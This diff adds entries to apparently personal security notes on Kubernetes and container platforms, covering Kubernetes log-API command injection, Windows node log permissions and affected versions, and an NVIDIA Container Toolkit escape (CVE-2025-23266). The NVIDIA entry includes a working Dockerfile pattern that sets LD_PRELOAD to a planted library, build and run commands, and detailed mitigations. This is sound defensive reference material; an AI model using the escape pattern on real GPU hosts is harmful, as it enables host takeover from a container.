@@ -81,6 +81,23 @@ Windows Containers
 	Container Breakouts
 		https://github.com/SafeBreach-Labs/CoWTools
 
+	Command injection via nodes/*/logs/query API
+		https://github.com/kubernetes/kubernetes/issues/129654
+
+	Read and modify logs from Windows nodes
+		https://github.com/kubernetes/kubernetes/issues/126161
+		BUILTIN\Users may be able to read container logs 
+		NT AUTHORITY\Authenticated Users may be able to modify container logs
+		
+		to see if any Windows nodes are in use:
+			kubectl get nodes -l kubernetes.io/os=windows 
+
+		kubelet <= 1.27.15
+		kubelet <= 1.28.11
+		kubelet <= 1.29.6
+		kubelet <= 1.30.2
+
+
 RedHat's OpenShift
 	"Enterprise Kubernetes"
 
@@ -131,6 +148,47 @@ K3s
 
 	CIS assessment
 		https://rancher.com/docs/k3s/latest/en/security/self_assessment/
+
+
+NVIDIA Container Toolkit (NCT)
+	https://www.wiz.io/blog/nvidia-ai-vulnerability-cve-2025-23266-nvidiascape
+
+	FROM busybox
+	ENV LD_PRELOAD=/proc/self/cwd/poc.so
+	ADD poc.so /
+
+	# Build the malicious container
+	$ docker build . -t nct-exploit
+
+	# Run it on a host with the vulnerable NVIDIA Container Toolkit
+	$ docker run --rm --runtime=nvidia --gpus=all nct-exploit
+
+	When this container is run on a vulnerable system, the nvidia-ctk createContainer hook inherits the LD_PRELOAD variable. Since the hook's working directory is the container's filesystem, it loads the attacker's poc.so file into its own privileged process, instantly achieving a container escape.
+
+	Mitigation:
+
+	For NVIDIA Container Runtime
+		When using the NVIDIA Container Runtime in legacy mode, you can disable the hook by editing the /etc/nvidia-container-toolkit/config.toml file and setting the features.disable-cuda-compat-lib-hook flag to true:
+
+		[features]
+		disable-cuda-compat-lib-hook = true
+
+	For NVIDIA GPU Operator
+		When using the NVIDIA GPU Operator, you can disable the hook by adding disable-cuda-compat-lib-hook to the NVIDIA_CONTAINER_TOOLKIT_OPT_IN_FEATURES environment variable. This can be done by including the following arguments when installing or upgrading the GPU Operator with Helm:
+
+		--set
+		"toolkit.env[0].name=NVIDIA_CONTAINER_TOOLKIT_OPT_IN_FEATURES" \
+		--set
+		"toolkit.env[0].value=disable-cuda-compat-lib-hook"
+
+		Note: Any other feature flags should be added as a comma-separated list to the value field.
+
+		For users with a GPU Operator version prior to 25.3.1, you can deploy the patched NVIDIA Container Toolkit version 1.17.8 by including the following arguments in your Helm command:
+
+		--set "toolkit.version=v1.17.8-ubuntu20.04"
+
+		Note: For Red Hat Enterprise Linux or Red Hat OpenShift, you must specify the v1.17.8-ubi8 tag.
+
 
 
 Support Lifecycles
